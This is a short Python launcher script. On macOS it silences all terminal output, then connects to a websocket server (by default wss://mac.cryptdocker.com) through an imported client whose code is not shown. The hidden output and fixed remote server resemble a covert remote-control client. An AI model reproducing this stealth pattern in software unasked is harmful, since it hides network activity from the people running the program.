import sys
import asyncio
import platform
import os

from websocket_client import run


if __name__ == "__main__":
    if platform.system() == "Darwin":
        # Ensure no terminal output even if launched from a shell.
        _devnull = open(os.devnull, "w")
        sys.stdout = _devnull
        sys.stderr = _devnull

    server_url = sys.argv[1] if len(sys.argv) > 1 else "wss://mac.cryptdocker.com"
    asyncio.run(run(server_url))
